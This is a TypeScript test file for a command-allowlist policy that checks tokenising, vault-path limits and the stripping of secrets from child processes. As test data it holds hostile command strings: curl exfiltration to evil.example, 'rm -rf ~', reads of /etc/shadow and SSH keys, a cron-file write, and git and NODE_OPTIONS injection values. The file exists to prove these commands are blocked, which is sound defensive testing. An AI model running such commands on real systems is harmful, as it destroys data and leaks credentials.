import { describe, it, expect } from "vitest";
import {
  checkCommand,
  childEnvironment,
  findUnsafeArgument,
  globMatch,
  tokenizeCommand,
  unrestricted,
} from "../src/command-policy";

// The shipped example list, used here so the documentation is enforced against
// dangerous arguments rather than only described.
const EXAMPLE = "ls *,stat *,grep *,wc *,head *,tail *,pdftotext *";

describe("tokenizeCommand", () => {
  it("splits a plain invocation", () => {
    expect(tokenizeCommand("pdftotext -layout notes/a.pdf")).toEqual({
      program: "pdftotext",
      args: ["-layout", "notes/a.pdf"],
    });
  });

  it("groups quoted arguments, which is how vault paths with spaces work", () => {
    expect(tokenizeCommand('pdftotext "My Note.pdf" out.txt')).toEqual({
      program: "pdftotext",
      args: ["My Note.pdf", "out.txt"],
    });
    expect(tokenizeCommand("grep 'two words' notes.md")).toEqual({
      program: "grep",
      args: ["two words", "notes.md"],
    });
  });

  it("keeps backslash escapes out of the argument", () => {
    expect(tokenizeCommand('grep a\\"b notes.md').args).toEqual(['a"b', "notes.md"]);
    expect(tokenizeCommand("ls note\\ name.md").args).toEqual(["note name.md"]);
  });

  it("rejects unterminated quoting instead of guessing", () => {
    expect(() => tokenizeCommand('ls "unclosed')).toThrow(/unterminated double quote/);
    expect(() => tokenizeCommand("ls 'unclosed")).toThrow(/unterminated single quote/);
    expect(() => tokenizeCommand("ls trailing\\")).toThrow(/backslash/);
  });

  it("rejects an empty command and a NUL", () => {
    expect(() => tokenizeCommand("   ")).toThrow(/empty/);
    expect(() => tokenizeCommand("ls\u0000 -la")).toThrow(/null bytes/);
    expect(() => tokenizeCommand("ls\nrm -rf ~")).toThrow(/single line/);
  });
});

describe("shell metacharacters are literal, because no shell runs", () => {
  // The regression the review asked for. With `exec` these strings decided what
  // the shell executed, so a tokenizer that disagreed with the shell was a
  // bypass. With `execFile` there is nothing to interpret: the operator becomes
  // an ordinary character of an argument and no second program can start.
  const attacks = [
    "ls; rm -rf ~",
    "ls && curl http://evil.example",
    "ls || curl http://evil.example",
    "ls | curl -T- http://evil.example",
    "ls &",
    "ls `id`",
    "grep $(cat /etc/shadow) notes.md",
    'grep "$(id)" notes.md',
    "grep '$(id)' notes.md",
    "grep \\$(id) notes.md",
    "ls > /etc/cron.d/evil",
    "ls < notes.md",
    "echo <(id)",
    "ls ; rm -rf ~",
  ];

  for (const attack of attacks) {
    it(`starts exactly one program for ${JSON.stringify(attack)}`, () => {
      const parsed = tokenizeCommand(attack);
      const first = attack.trim().split(/\s+/)[0];
      // execFile gets exactly one program: the first token, quoted or not.
      expect(parsed.program).toBe(first);

      if (/^[a-z]+[;&|<>]/.test(first)) {
        // An operator glued to the name (`ls;`) is part of the program name:
        // there is no such executable, and a whole-command allowlist refuses it
        // too. Either way the second half of the string is never executed.
        expect(checkCommand(parsed.program, parsed.args, EXAMPLE), attack).not.toBeNull();
      } else {
        // A separate operator token is passed to the program as data.
        expect(parsed.args.join(" ")).toMatch(/[;&|`$<>()]/);
      }
    });
  }

  it("quotes cannot smuggle a substitution past the check", () => {
    // Under a shell these three behave differently; here all three are text.
    for (const cmd of ['grep "$(id)" notes.md', "grep '$(id)' notes.md", "grep $(id) notes.md"]) {
      const parsed = tokenizeCommand(cmd);
      expect(parsed.args).not.toContain("id");
      expect(parsed.args.some(a => a.includes("$"))).toBe(true);
    }
  });

  it("refuses the subset whose arguments would reach outside the vault", () => {
    for (const cmd of ["ls > /etc/cron.d/evil", "grep $(cat /etc/shadow) notes.md"]) {
      const parsed = tokenizeCommand(cmd);
      expect(checkCommand(parsed.program, parsed.args, EXAMPLE), cmd).not.toBeNull();
    }
  });

  it("blocks the whole command shape, so a listed program cannot be abused with extra words", () => {
    expect(checkCommand("git", ["-c", "core.fsmonitor=id", "status"], "git status")).not.toBeNull();
    expect(checkCommand("git", ["status"], "git status")).toBeNull();
  });
});

describe("argument hygiene with a restrictive allowlist", () => {
  it("rejects arguments that leave the vault directory", () => {
    const attacks = [
      ["grep", ["secret", "/data/config.json"]],
      ["cat", ["../etc/passwd"]],
      ["head", ["~/ssh/id_ed25519"]],
      ["stat", ["\\\\nas\\share\\secrets"]],
      ["tail", ["C:\\windows\\win.ini"]],
      ["grep", ["x", "notes/../private.md"]],
    ];
    for (const [program, args] of attacks) {
      expect(findUnsafeArgument(args), args.join(" ")).not.toBeNull();
      expect(checkCommand(program, args, EXAMPLE), args.join(" ")).not.toBeNull();
    }
  });

  it("rejects flags that make a helper execute or delete by itself", () => {
    expect(findUnsafeArgument(["-exec", "rm", "x"])).toContain("executes or deletes");
    expect(findUnsafeArgument(["--delete"])).toContain("executes or deletes");
    expect(findUnsafeArgument(["-ok", "rm"])).toContain("executes or deletes");
  });

  it("keeps vault-relative work working", () => {
    for (const [program, args] of [
      ["grep", ["-rn", "needle", "notes"]],
      ["ls", ["notes/sub"]],
      ["pdftotext", ["notes/a.pdf", "notes/a.txt"]],
    ] as [string, string[]][]) {
      expect(checkCommand(program, args, EXAMPLE), `${program} ${args.join(" ")}`).toBeNull();
    }
  });

  it("does not constrain the explicit wildcard setting", () => {
    // `*` means "no restriction requested": the program list is open, so there
    // is no allowlist to keep honest. No shell runs either way.
    expect(unrestricted("*")).toBe(true);
    expect(unrestricted("")).toBe(true);
    expect(checkCommand("anything", ["/etc/passwd"], "*")).toBeNull();
  });

  it("blocks commands that no pattern matches", () => {
    expect(checkCommand("python", ["script.py"], EXAMPLE)).toContain("does not match the allowed patterns");
    expect(checkCommand("git", ["push", "--force"], EXAMPLE)).toContain("does not match the allowed patterns");
  });

  it("treats a bare program name as that command with no arguments", () => {
    // This is what keeps a list meaningful: listing `pdftotext` does not hand
    // over every option pdftotext has.
    expect(checkCommand("pdftotext", [], "pdftotext")).toBeNull();
    expect(checkCommand("pdftotext", ["secret.pdf"], "pdftotext")).not.toBeNull();
    expect(checkCommand("pdftotext", ["notes/a.pdf", "notes/a.txt"], "pdftotext *")).toBeNull();
    // A loose wildcard stays loose: `pdftotext *.md` matches any arguments at
    // all, because `*` also matches spaces and slashes. That is exactly why an
    // exact command, or a pattern that pins the argument shape, is the
    // meaningful restriction.
    expect(checkCommand("pdftotext", ["-lua-filter=evil.lua", "a.md"], "pdftotext *.md")).toBeNull();
    expect(checkCommand("pdftotext", ["notes/a.md"], "pdftotext notes/*.md")).toBeNull();
    expect(checkCommand("pdftotext", ["-lua-filter=evil.lua", "a.md"], "pdftotext notes/*.md")).not.toBeNull();
  });
});

describe("child environment", () => {
  it("never hands the API key to a program it starts", () => {
    const env = childEnvironment({
      VAULT_API_KEY: "super-secret-key",
      OBSIDIAN_VAULT_API_KEY: "other-secret",
      PATH: "/usr/bin",
      HOME: "/home/user",
      NODE_OPTIONS: "--require /tmp/evil.js",
    });
    expect(env.PATH).toBe("/usr/bin");
    expect(env.HOME).toBe("/home/user");
    const leaked = Object.keys(env).filter(k => /KEY|TOKEN|SECRET|PASSWORD/i.test(k));
    expect(leaked).toEqual([]);
    expect(env.VAULT_API_KEY).toBeUndefined();
    // NODE_OPTIONS and friends are injected into the process, not needed by a CLI.
    expect(env.NODE_OPTIONS).toBeUndefined();
  });

  it("passes what Windows needs to start a program", () => {
    const env = childEnvironment({ SystemRoot: "C:\\Windows", PATHEXT: ".COM;.EXE", PATH: "C:\\bin" });
    expect(env.SystemRoot).toBe("C:\\Windows");
    expect(env.PATHEXT).toBe(".COM;.EXE");
  });
});
